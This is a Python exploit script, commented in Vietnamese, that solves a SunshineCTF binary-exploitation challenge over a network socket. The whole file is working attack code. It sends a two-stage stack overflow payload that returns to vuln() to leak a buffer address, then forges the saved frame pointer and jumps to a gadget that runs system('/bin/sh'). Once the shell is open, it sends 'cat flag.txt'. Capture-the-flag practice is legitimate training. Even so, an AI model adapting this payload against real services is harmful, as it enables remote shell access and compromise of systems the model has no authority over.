#!/usr/bin/env python3
# solve_canaveral_fixed.py
import socket, re, struct, sys, time

HOST, PORT = "chal.sunshinectf.games", 25603

VULN     = 0x401231   # start of vuln()
WIN_TAIL = 0x401218   # ✅ đúng gadget: mov rax,[rbp-0x10]; mov rdi,rax; call system@plt; leave; ret
SH_ADDR  = 0x402008   # "/bin/sh"
OFF_RET  = 72         # offset tới saved RIP

def recvall(s, timeout=2.0):
    s.settimeout(timeout)
    out = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            out += chunk
    except Exception:
        pass
    return out

def build_stage1():
    # Ghi đè RIP -> quay lại vuln() để lấy leak và có lần nhập thứ 2
    buf  = bytearray(b"A"*0x40)
    buf += b"B"*8                      # saved RBP (bất kỳ)
    buf += struct.pack("<Q", VULN)     # saved RIP -> vuln()
    buf += b"\n"
    return bytes(buf)

def build_stage2(buf2_addr):
    # Trong lần 2: [rbp-0x10] = buf + 0x30
    # → đặt con trỏ "/bin/sh" tại offset 0x30 của buffer
    buf  = bytearray(b"A"*0x30)
    buf += struct.pack("<Q", SH_ADDR)                # buf[0x30:0x38] = &"/bin/sh"
    buf += b"C"*(0x40 - len(buf))                    # pad tới 0x40
    buf += struct.pack("<Q", buf2_addr + 0x20)       # saved RBP sao cho [rbp-0x10] == buf+0x30
    buf += struct.pack("<Q", WIN_TAIL)               # ✅ nhảy đúng gadget
    buf += b"\n"
    return bytes(buf)

def solve():
    s = socket.create_connection((HOST, PORT), timeout=6)

    # Banner + prompt đầu
    out = recvall(s, timeout=1.2).decode("latin1", "replace")
    if out: print(out, end="")

    # ---- Stage 1: quay lại vuln() ----
    s.sendall(build_stage1())
    out = recvall(s, timeout=1.2).decode("latin1", "replace")
    if out: print(out, end="")

    m = re.search(r"(0x[0-9a-fA-F]+)", out)
    if not m:
        print("[!] Không lấy được leak buf1"); return
    buf1 = int(m.group(1), 16)
    buf2 = buf1 + 8                      # địa chỉ buf lần 2
    print(f"[*] buf1 = {hex(buf1)} ; buf2 ≈ {hex(buf2)}")

    # (tuỳ) đọc thêm chút output/prompt
    time.sleep(0.05)
    more = recvall(s, timeout=0.6).decode("latin1", "replace")
    if more: print(more, end="")

    # ---- Stage 2: ret -> gadget -> system("/bin/sh") ----
    s.sendall(build_stage2(buf2))

    # Cho shell lên rồi đọc flag
    time.sleep(0.15)
    try:
        s.sendall(b"cat flag.txt\n")
    except Exception:
        pass

    out = recvall(s, timeout=2.5).decode("latin1", "replace")
    print(out)
    m = re.search(r"(sun\{[^}]+\})", out)
    if m:
        print("FLAG:", m.group(1))
    else:
        print("[?] Chưa thấy flag — gửi lại 'cat flag.txt' thử nhé.")
    s.close()

if __name__ == "__main__":
    solve()
